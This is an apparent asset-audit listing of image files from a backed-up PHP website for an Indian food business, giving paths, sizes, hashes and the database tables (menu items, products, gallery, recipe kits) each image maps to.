demand-05.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-05.jpg,80834,1049263cbb0fcb46e584f5cd74f46193eb15d929b342900b9015ae4cb05367ac,554bf2b1d1bf3b6e8021e8a6bae105cb,Static / Orphaned Disk Asset,,,,
demand-06.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-06.jpg,121595,3c9cba2eae087257f4908a044b7ad09088252fd1c0d41f5085c93a7df2f9e41e,fa084de2f92211f243bfdc1ad3966210,Static / Orphaned Disk Asset,,,,
demand-07.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-07.jpg,97201,e6c2c939b35fb9b5a8f44ca86c425339555e9a4469aa76512be2d8cede60f5fb,74aa500af9a060752134738e88c1c5a5,Static / Orphaned Disk Asset,,,,
demand-08.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-08.jpg,96016,c4b6e16f71257e46f49fe08e268e3892491e83afdb48307d426bfac01778b250,349b7b2a42101ef4b25a465ee38e7964,Static / Orphaned Disk Asset,,,,
service-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-01.jpg,95231,ce79313be18a3f6729878e25409e8deb77358298d28d43eb2205c7765a7be06b,9dd26931df1e5b0401f1f425537b548c,Static / Orphaned Disk Asset,,,,
service-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-02.jpg,109666,7854d5f96d1b8d1eddd2fa5f260e6dacf705bceb402c4fce101bd9ec1a5ee577,d24eb2fabd44df90ea536182a0fc1e1e,Static / Orphaned Disk Asset,,,,
service-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/serivces/service-03.jpg,142265,ed9f997dd7332f31800105c7251744280c5fb9c0d4efd23d616f3326067c3740,2be18c39a8a97735b4980d73367b85fd,Static / Orphaned Disk Asset,,,,
slider-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-01.jpg,183740,73682b50944d4e491aed53bcbe7a9686399d11b2b0bdf62a676f7b8f0007c373,644db9a00583e02836a330bf04ee5d3f,Static / Orphaned Disk Asset,,,,
slider-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-02.jpg,114607,4d2371c90c3a5e2e2d6fad5b638ab3715cc4c9cfc9284813fc4ea1926e8ea18a,a37f4028f501768b2adc19988647faa2,Static / Orphaned Disk Asset,,,,
slider-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/slider/slider-03.jpg,148325,43e4d167fb0db143ecf0e48cb1ad20db56f88e4fbbd1db09844207be81f0cf1b,2ae4a8f83140bff7f2f562fa19ec97e8,Static / Orphaned Disk Asset,,,,
special-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-01.jpg,33115,2c38d8ba4a424661f442761de9d604a5f627ab03271876445b56107f4c18e012,81cc5746efd277f90bf062bd65f96b63,Static / Orphaned Disk Asset,,,,
special-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-02.jpg,36163,baf4bdf066ded0aca010bac9593acc5b737f6e8b5d5fb4412033b0e8e8b5fdbb,9be28407c36f31ce9ebc6cca90250643,Static / Orphaned Disk Asset,,,,
special-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-03.jpg,38877,15ce7c2ace8bc8d9af5a09cc14e7db35aa2c5617b55a274cd0780d421ac778b4,9afa8b98c1a5e38160d9341c9928a03e,Static / Orphaned Disk Asset,,,,
special-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-04.jpg,42037,47098b783a3662b8f7091a08830f833883fea6fd54528949e0c36d57ff5b0518,44bfb33fda0c3528d0adbcdaf6575b7f,Static / Orphaned Disk Asset,,,,
special-05.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-05.jpg,38417,159c2edf4f50f7a2e2940d26a285a8d505283feeaa215a28ba95f29b33d65077,0c0ce45fece6c637d191bf6b4b5dcc64,Static / Orphaned Disk Asset,,,,
special-06.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/special/special-06.jpg,42104,060eae6b01a931ac9b296b3f24e2e054c387733787e2f61d1ce64e416bbdb69c,b4d82dbbb4783c393e288ecc4c613fb3,Static / Orphaned Disk Asset,,,,
wordwild-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/wordwild/wordwild-01.jpg,47952,cc387308d2ff02a13726daa9479548e62bb5df9e7a135140f3120e5f8883db74,facb9eb534a4dd63c73215a45ca8ba8a,Static / Orphaned Disk Asset,,,,
wordwild-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/wordwild/wordwild-02.jpg,42990,f1f2032367b6ef57b491a7c6a408e1781886ff7ec909a887dd0cc76b30a09a3e,5630df2dce730cc414d06b58046bac5e,Static / Orphaned Disk Asset,,,,
.jpg,old-website-php/Full-website-backup/frontEnd/items/.jpg,67087,867fedd024a2fa740c9e6f6c09f65d610d542748beff9739beb07ccc50729dde,483ec61bde8e2e847fdd7b325b329545,Static / Orphaned Disk Asset,,,,
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),menu_item_tbl,1,Dosa (Plain & Masala),menu_small_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),product_item_tbl,1,Desi Bundi Laddo,menu_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),website_gallery,1,Images 1,gimage
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),recipe_appliances_kits,1,Onion,kits_img
1.jpg,old-website-php/Full-website-backup/frontEnd/items/1.jpg,7043,fbf2332171158a9ae54ef809ab41f31baedb5702d5b7627a31ddf0bb4a045a16,cff992df65b08d3290d291a3184d192b,DB Mapped (Verified),event_cuisine,1,South Indian,cuisine_img
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),product_item_tbl,10,Atta Panjiri,menu_img
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),website_gallery,10,Evevt At rishikesh,gimage
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),worke_work_experience,10,as worked at2,workproimg
10.jpg,old-website-php/Full-website-backup/frontEnd/items/10.jpg,12988,4f56173fa028b0e84cbca5a8f41d8ab75d1b65c41fdbe066435a7429c32c9f33,77958e4a48b00baa209cf8adb3e5b1e6,DB Mapped (Verified),recipe_appliances_kits,10,Red Bell Pepper,kits_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),menu_item_tbl,11,Dal Tadka,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),product_item_tbl,11,Balushai,menu_img
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),website_gallery,11,Event at Delhi,gimage
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),worke_work_experience,11,North Indian Dishes by,workproimg
11.jpg,old-website-php/Full-website-backup/frontEnd/items/11.jpg,7557,b993bc36926aa2e7f0641f717818b221b8c863378116b0aceddb598ca88084e1,afd10a47409b0df2791fc5ce0d11946a,DB Mapped (Verified),recipe_appliances_kits,11,Yellow Bell Pepper,kits_img
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),product_item_tbl,12,Besan Dry Fruit Laddo,menu_img
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),website_gallery,12,Event at Delhi,gimage
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),worke_work_experience,12,North Indian Dishes by2,workproimg
12.jpg,old-website-php/Full-website-backup/frontEnd/items/12.jpg,6906,9b18bc273421e16ef3615b30a64f8de3f08bfecf0d0cb497eac03b1414e6f4fd,283259a2910ef5674b0d90484b68650e,DB Mapped (Verified),recipe_appliances_kits,12,Mushroom,kits_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),menu_item_tbl,13,Paneer Lababdar,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),product_item_tbl,13,Besan Laddo,menu_img
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),website_gallery,13,Evevt At rishikesh,gimage
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),worke_work_experience,13,tarters Dishes by1,workproimg
13.jpg,old-website-php/Full-website-backup/frontEnd/items/13.jpg,8178,f712d28d7e551c4c554ce71509da279dd40850f7594d1550a169f4d2de9f787b,2d99f22d9dfeae725670fa1a2601f4e3,DB Mapped (Verified),recipe_appliances_kits,13,Mint Leaves,kits_img
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),product_item_tbl,14,Chhena Murgi,menu_img
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),website_gallery,14,Event at Delhi,gimage
14.jpg,old-website-php/Full-website-backup/frontEnd/items/14.jpg,5989,a47e000a49afecda456a837f99f0b1b3058537acf6a0847ec1a2b1e73f86792e,02e0a6c393a316b557db1962464b8e71,DB Mapped (Verified),worke_work_experience,14,tarters Dishes by12,workproimg
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),product_item_tbl,15,Desi Ghee Bundi,menu_img
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),website_gallery,15,Event at DPS school Gurugram,gimage
15.jpg,old-website-php/Full-website-backup/frontEnd/items/15.jpg,14325,202844a28966bf95539e1a4b3127f61ec7dc6cdb1ff60f5d68cd0c5d781e67ac,0012e082ab7b93fcc4dc01767e24b578,DB Mapped (Verified),worke_work_experience,15,Desserts Dishes by1,workproimg
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),product_item_tbl,16,Desi Ghee Bundi Ladoo,menu_img
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),website_gallery,16,Event at DPS school Gurugram,gimage
16.jpg,old-website-php/Full-website-backup/frontEnd/items/16.jpg,8684,2dc79a396818a36ca9dd5093d1f8c4745230682226e897182fd41aa85db5c088,6ec9b9fe0a3fe037dd724b778ad2e4e0,DB Mapped (Verified),worke_work_experience,16,Desserts Dishes by3,workproimg
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),product_item_tbl,17,Desi Ghee Gujia,menu_img
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),website_gallery,17,Event at DPS school Gurugram,gimage
17.jpg,old-website-php/Full-website-backup/frontEnd/items/17.jpg,11516,34e3c79138322d9828e5543ad2be801ff4b4dfdfca82553689d59090f6dc6480,33adcb9539cbaa2e051fd59476469227,DB Mapped (Verified),worke_work_experience,17,Desserts Dishes by2,workproimg
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),menu_item_tbl,18,Aloo Gobhi,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),product_item_tbl,18,Desi Ghee Patisha,menu_img
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),website_gallery,18,event at noida,gimage
18.jpg,old-website-php/Full-website-backup/frontEnd/items/18.jpg,6912,523ff3d26d391b16691496da484020692558e6af033ef6b53da098bd2bb92416,376f3f32d232ac2aa973fd7978c9cdb5,DB Mapped (Verified),worke_work_experience,18,reakfast Dishes by2,workproimg
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),product_item_tbl,19,Dry Fruit Patisha,menu_img
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),website_gallery,19,Event at Delhi,gimage
19.jpg,old-website-php/Full-website-backup/frontEnd/items/19.jpg,12505,3d04104df7a85c1d215265edbd7030387475b36dbda2d0c39bb7cd7c6202cdec,a52fe87158583869aba55a5279c136ba,DB Mapped (Verified),worke_work_experience,19,reakfast Dishes by1,workproimg
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/items/2.jpg,12788,5bd7b6d697319361e2a883e2ece8446f746389f768d0584ac7f01e241eac5694,fd3978971e3adaf0080684aaa4ab8c85,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),product_item_tbl,20,Karachi Halwai,menu_img
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),website_gallery,20,Event at Ghaziabadh,gimage
20.jpg,old-website-php/Full-website-backup/frontEnd/items/20.jpg,10674,91d3e2e3e700e3460061d4753285f93600eb2c1e58274e542f15783493c21f9f,2f6f60aa410d1d91623416df92567baf,DB Mapped (Verified),worke_work_experience,20,Chinese Dishes by,workproimg
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),product_item_tbl,21,Meva Panjiri,menu_img
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),website_gallery,21,Event at Ghaziabadh,gimage
21.jpg,old-website-php/Full-website-backup/frontEnd/items/21.jpg,13302,0da6211caef1e82eb4bf2c87e74ce75e789cb742ab3f97635eb76e497dcc443e,dc5e8f64e2f7b562e8e13124a5d7c395,DB Mapped (Verified),worke_work_experience,21,Chinese Dishes by 2,workproimg
22.jpg,old-website-php/Full-website-backup/frontEnd/items/22.jpg,8465,ca331f28733dd40a0bb0456baa3c0276ba026a9cd5579efdd553155b35c815a9,9b16de59ce30e7f4b7da3b1c65f30b34,DB Mapped (Verified),menu_item_tbl,22,Kheer,menu_img
22.jpg,old-website-php/Full-website-backup/frontEnd/items/22.jpg,8465,ca331f28733dd40a0bb0456baa3c0276ba026a9cd5579efdd553155b35c815a9,9b16de59ce30e7f4b7da3b1c65f30b34,DB Mapped (Verified),product_item_tbl,22,Kathal ka Achaar,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/items/23.jpg,9688,b139696f255d3dbb787618a209f62fd97af4b2fee7ba88f40da939ac665b19d1,0e21dafbcf0f6aa58391ed527876ade1,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/items/24.jpg,13760,7203643dd8f7047f001f45ff9c723a7f9d92d1522aa32a54a908f92d44bd0c62,c6393410594f39e64f048a1b64d89afa,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
25.jpg,old-website-php/Full-website-backup/frontEnd/items/25.jpg,11950,35e9330024ee3472066072ff78f48234166b4781366b34ffb462cfed9a8070ce,3812bcdd4a7d9139eb5c624f26169912,DB Mapped (Verified),product_item_tbl,25,Hari bhri Mirchi,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),menu_item_tbl,26,Lemon Coriander Soup,menu_small_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),product_item_tbl,26,Ginger Garlic Pickle,menu_img
26.jpg,old-website-php/Full-website-backup/frontEnd/items/26.jpg,14028,69481b8c28d37c2c5f4a693e0802cdc7243d875d0237a629c552e4d59b7cbebb,fc9a2a098551323f1923a6d4bc4f5fc4,DB Mapped (Verified),worke_work_experience,26,cuisine,workproimg
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),menu_item_tbl,27,Chicken Manchow Soup,menu_small_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),product_item_tbl,27,Chilli Mix Pickle,menu_img
27.jpg,old-website-php/Full-website-backup/frontEnd/items/27.jpg,11060,364c48b4501769e7164e03b1a714e5b973a3e8acf1c47dc914d05a73ef65813a,7466851d59d26f58461847df23d9c721,DB Mapped (Verified),worke_work_experience,27,north indian,workproimg
28.jpg,old-website-php/Full-website-backup/frontEnd/items/28.jpg,9761,e3c6326710fd902cec0f239f0396742ee95151ea2421db67a29d6f1902210117,d2709294a0b847d3b73a0a8e04eb8639,DB Mapped (Verified),product_item_tbl,28,Tomato chutney,menu_img
29.jpg,old-website-php/Full-website-backup/frontEnd/items/29.jpg,7845,ecb0fd5bceb1ac91966c9c8ac7e8126f463dd564eaed2f725ae87a4614fb3514,465c79d21ad0c03178e2a8120f4b891a,DB Mapped (Verified),product_item_tbl,29,Mint Peanut Chutney Recipe,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),menu_item_tbl,3,Mixed Veg Uttappam,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),product_item_tbl,3,Loose Gol Matthi,menu_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),website_gallery,3,Images 3,gimage
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),recipe_appliances_kits,3,Refined Oil,kits_img
3.jpg,old-website-php/Full-website-backup/frontEnd/items/3.jpg,6464,e8863e062288178ded3a2222d433abd2c461a5fbbbd393867e648b58c8ad8d9f,568e835bbfdea350ae8b9cab56b44217,DB Mapped (Verified),event_cuisine,3,China to India,cuisine_img
30.jpg,old-website-php/Full-website-backup/frontEnd/items/30.jpg,9088,b1314531e8a72726344bbd77f56a51ede6285d31b3244cd176a9acfecb4a5edb,d885824e3015dff9824db2c82de3c81e,DB Mapped (Verified),product_item_tbl,30,Coconut Chutney,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/items/31.jpg,8738,757c2a2829d0cf02530ae168daa2525755bf8333b6ffa668cbaf0acc47004908,850ae33b9ebb2bf787081f413c2d03e8,DB Mapped (Verified),menu_item_tbl,31,Fruits,menu_img
31.jpg,old-website-php/Full-website-backup/frontEnd/items/31.jpg,8738,757c2a2829d0cf02530ae168daa2525755bf8333b6ffa668cbaf0acc47004908,850ae33b9ebb2bf787081f413c2d03e8,DB Mapped (Verified),product_item_tbl,31,Coriander Coconut Chutney,menu_img
32.jpg,old-website-php/Full-website-backup/frontEnd/items/32.jpg,9135,2ec21fa5514ce9900a12e651b099d10493731f93c87a3fc7cf4c09440053fbee,8c975e8ca07c559c8c0de0fb88ac7e77,DB Mapped (Verified),menu_item_tbl,32,Poha,menu_img
32.jpg,old-website-php/Full-website-backup/frontEnd/items/32.jpg,9135,2ec21fa5514ce9900a12e651b099d10493731f93c87a3fc7cf4c09440053fbee,8c975e8ca07c559c8c0de0fb88ac7e77,DB Mapped (Verified),product_item_tbl,32,Tomato Thokku,menu_img
33.jpg,old-website-php/Full-website-backup/frontEnd/items/33.jpg,12278,3147b36961f555c005b2b852b86a6285039f3fa6b25265399e61a21271dc8208,403f35c74f984cc8fef04aab033245ec,DB Mapped (Verified),product_item_tbl,33,Peanut Chutney | Groundnut Chutney,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/items/34.jpg,9919,6e237c8b85f3e8848100d0b73736d1db592fdf4cf75814b32470ecc67986fa43,483ebe34c2d43af8db769f5432bbc5eb,DB Mapped (Verified),menu_item_tbl,34,Sprouts,menu_img
34.jpg,old-website-php/Full-website-backup/frontEnd/items/34.jpg,9919,6e237c8b85f3e8848100d0b73736d1db592fdf4cf75814b32470ecc67986fa43,483ebe34c2d43af8db769f5432bbc5eb,DB Mapped (Verified),product_item_tbl,34,Moringa Leaves Chutney,menu_img
35.jpg,old-website-php/Full-website-backup/frontEnd/items/35.jpg,11738,eff23f18f12b4e89ab9498adcae33781034c737337d7182c57d12f3854020581,1d5f750a8f8c4244c42a6593d12d3eb1,DB Mapped (Verified),menu_item_tbl,35,Cheela,menu_img
35.jpg,old-website-php/Full-website-backup/frontEnd/items/35.jpg,11738,eff23f18f12b4e89ab9498adcae33781034c737337d7182c57d12f3854020581,1d5f750a8f8c4244c42a6593d12d3eb1,DB Mapped (Verified),product_item_tbl,35,Green Tomato Chutney,menu_img
36.jpg,old-website-php/Full-website-backup/frontEnd/items/36.jpg,11949,cf12f9b151d6e1483d06ca266efafe43cca59ca9f5cb8ae0094ad6de4437e3fb,932b2e7171d7185ac6a3ee21658c132d,DB Mapped (Verified),product_item_tbl,36,Chana Dal Chutney | Kadale Bele Chutney,menu_img
